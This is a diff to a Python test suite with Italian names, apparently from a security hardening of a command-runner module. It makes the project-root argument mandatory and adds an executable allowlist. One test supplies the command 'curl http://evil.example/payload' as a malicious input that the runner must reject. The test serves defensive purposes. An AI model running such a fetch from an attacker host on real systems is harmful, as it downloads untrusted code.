@@ -20,7 +20,7 @@ def porta_libera() -> int:
 class SentinellaTest(unittest.TestCase):
     def test_rifiuta_comando_non_whitelistato(self) -> None:
         with self.assertRaises(ValueError):
-            sentinella.esegui("mancante", {})
+            sentinella.esegui("mancante", {}, radice_progetto=Path("."))
 
     def test_esegue_comando_whitelistato_e_salva_log_fuori_evento(self) -> None:
         comando = {
@@ -31,7 +31,7 @@ class SentinellaTest(unittest.TestCase):
                 "limite_output_caratteri": 1000,
             }
         }
-        esito, codice, _latenza, output = sentinella.esegui("prova", comando)
+        esito, codice, _latenza, output = sentinella.esegui("prova", comando, radice_progetto=Path("."))
         self.assertEqual(esito, "superato")
         self.assertEqual(codice, 0)
         self.assertIn("ok", output)
@@ -76,19 +76,53 @@ class SentinellaTest(unittest.TestCase):
             self.assertEqual(esito, "superato")
             self.assertEqual(codice, 0)
 
-    def test_senza_radice_progetto_nessun_controllo_di_contenimento(self) -> None:
-        """Compatibilita' con i chiamanti che non conoscono ancora la radice:
-        radice_progetto=None (default) non applica il controllo."""
-        with tempfile.TemporaryDirectory() as fuori:
+    def test_radice_progetto_e_obbligatoria(self) -> None:
+        """Guardrail (residuo C2, revisione sicurezza v3, 2026-08-26): prima
+        radice_progetto era opzionale e un chiamante che invocava esegui()
+        come libreria senza passarlo restava silenziosamente senza
+        protezione di contenimento. Ora e' un parametro obbligatorio:
+        dimenticarlo e' un TypeError esplicito a tempo di chiamata."""
+        comando = {
+            "prova": {
+                "cartella": ".",
+                "argomenti": ["python", "-c", "print('ok')"],
+                "timeout_secondi": 10,
+                "limite_output_caratteri": 1000,
+            }
+        }
+        with self.assertRaises(TypeError):
+            sentinella.esegui("prova", comando)  # type: ignore[call-arg]
+
+    def test_rifiuta_eseguibile_non_in_allowlist(self) -> None:
+        """Guardrail (residuo C2, revisione sicurezza v3, 2026-08-26):
+        esegui() limitava solo la cartella, non quale binario poteva
+        girare - un comandi.json malevolo poteva lanciare un eseguibile
+        arbitrario purche' dentro la radice del progetto."""
+        with tempfile.TemporaryDirectory() as radice:
             comando = {
                 "prova": {
-                    "cartella": fuori,
-                    "argomenti": ["python", "-c", "print('ok')"],
+                    "cartella": radice,
+                    "argomenti": ["curl", "http://evil.example/payload"],
                     "timeout_secondi": 10,
                     "limite_output_caratteri": 1000,
                 }
             }
-            esito, codice, _latenza, _output = sentinella.esegui("prova", comando)
+            with self.assertRaises(ValueError):
+                sentinella.esegui("prova", comando, radice_progetto=Path(radice))
+
+    def test_accetta_eseguibile_con_suffisso_windows(self) -> None:
+        with tempfile.TemporaryDirectory() as radice:
+            comando = {
+                "prova": {
+                    "cartella": radice,
+                    "argomenti": ["PYTHON.EXE", "-c", "print('ok')"],
+                    "timeout_secondi": 10,
+                    "limite_output_caratteri": 1000,
+                }
+            }
+            esito, codice, _latenza, _output = sentinella.esegui(
+                "prova", comando, radice_progetto=Path(radice)
+            )
             self.assertEqual(esito, "superato")
             self.assertEqual(codice, 0)
 
@@ -118,7 +152,7 @@ class SentinellaTest(unittest.TestCase):
                 "verifiche_connessione": [f"127.0.0.1:{porta}"],
             }
         }
-        esito, codice, latenza_ms, output = sentinella.esegui("prova", comando)
+        esito, codice, latenza_ms, output = sentinella.esegui("prova", comando, radice_progetto=Path("."))
         self.assertEqual(esito, "errore_ambiente")
         self.assertEqual(codice, 111)
         self.assertEqual(latenza_ms, 0)
